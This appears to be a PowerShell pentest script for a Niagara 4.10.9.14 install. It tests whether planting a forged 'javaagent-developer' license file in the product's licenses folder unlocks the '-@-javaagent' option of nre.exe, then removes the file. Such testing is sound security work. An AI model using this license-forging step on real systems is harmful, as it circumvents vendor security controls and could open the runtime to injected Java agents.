$ErrorActionPreference = 'Continue'
$licDir  = 'C:\Niagara\iC-Niagara-4.10.9.14\security\licenses'
$staging = 'C:\Users\ASUS\pentest-staging'
Write-Output 'RES === BASELINE: no license planted, -@-javaagent trigger ==='
$out = & 'C:\Niagara\iC-Niagara-4.10.9.14\bin\nre.exe' '-@-javaagent:whatever' -version 2>&1 | Out-String
$out -split "`n" | Where-Object { $_ -match 'FATAL|developer|agent|feature|Cannot|ERROR|version' } | Select-Object -First 8 | ForEach-Object { Write-Output ('RES ' + $_) }
Write-Output 'RES === PLANT fake developer license ==='
Copy-Item "$staging\javaagent-developer.license" "$licDir\" -Force
Write-Output ('RES planted=' + (Test-Path "$licDir\javaagent-developer.license"))
$out2 = & 'C:\Niagara\iC-Niagara-4.10.9.14\bin\nre.exe' '-@-javaagent:whatever' -version 2>&1 | Out-String
$out2 -split "`n" | Where-Object { $_ -match 'FATAL|developer|agent|feature|Cannot|ERROR|version|boot' } | Select-Object -First 8 | ForEach-Object { Write-Output ('RES2 ' + $_) }
Write-Output 'RES === RESTORE ==='
Remove-Item "$licDir\javaagent-developer.license" -Force -ErrorAction SilentlyContinue
Get-ChildItem "$licDir\db" -Recurse -Filter '*.license' -File -ErrorAction SilentlyContinue | Remove-Item -Force
Get-ChildItem "$licDir\db" -Directory -ErrorAction SilentlyContinue | ForEach-Object {
  if ((Get-ChildItem $_.FullName -Force -ErrorAction SilentlyContinue | Measure-Object).Count -eq 0) { Remove-Item $_.FullName -Force }
}
Write-Output ('RES restored=' + (-not (Test-Path "$licDir\javaagent-developer.license")))
Write-Output ('RES licroot-final=' + ((Get-ChildItem $licDir -File).Name -join ','))
